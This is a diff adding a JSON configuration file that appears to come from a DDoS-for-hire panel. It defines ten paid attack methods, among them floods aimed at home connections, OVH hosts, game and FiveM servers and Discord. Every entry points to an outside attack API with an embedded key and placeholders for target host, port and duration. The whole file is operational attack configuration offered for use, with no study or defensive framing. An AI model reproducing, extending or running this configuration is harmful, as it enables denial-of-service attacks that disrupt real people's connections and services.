@@ -1,0 +1,135 @@
+{
+     "Attacks" : [
+
+          {
+               "Name" : "tls-vip",
+               "AttackName" : "tls-vip",
+               "Description" : "Standard Home Flood",
+               "API" : "https://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=L7MIX",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },         
+          {
+               "Name" : "browser-vip",
+               "AttackName" : "browser-vip",
+               "Description" : "Standard Home Flood",
+               "API" : "https://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=L7WWE",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "tcp-vip",
+               "AttackName" : "tcp-vip",
+               "Description" : "Quartz TCP Attack",
+               "API" : "https://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=TCP-WAR",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "udp-vip",
+               "AttackName" : "udp-vip",
+               "Description" : "Quartz UDP Attack",
+               "API" : "https://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=UDP-DISMISS",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "homehold",
+               "AttackName" : "homehold",
+               "Description" : "Quartz Home Attack",
+               "API" : "https://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-HOME",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "ovhv1",
+               "AttackName" : "ovh1",
+               "Description" : "Quartz OVH Attack",
+               "API" : "https://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=OVH-DEATH",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "game-nuke",
+               "AttackName" : "game-nuke",
+               "Description" : "Quartz Game Attack",
+               "API" : "https://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-GAME",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "fivem-nuke",
+               "AttackName" : "fivem-nuke",
+               "Description" : "Quartz FiveM Attack",
+               "API" : "https://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=QUARTZ-FIVEM",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "discord",
+               "AttackName" : "discord",
+               "Description" : "Quartz Socket Attack",
+               "API" : "https://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=DISCORD-KILL",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          },
+          {
+               "Name" : "http-raw",
+               "AttackName" : "L7RAW",
+               "Description" : "Quartz Handshake Attack",
+               "API" : "https://quartz-api-system.lol/api?key=udpcat66532&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=L7RAW",
+               "moderation" : {
+                    "LimitMaxTime" : false,
+                    "MaxTime" : 300
+               },
+               "DefaultPort" : "80",
+               "AdminMethod" : false,
+               "VipMethod" : true
+          }
+     ]
+}
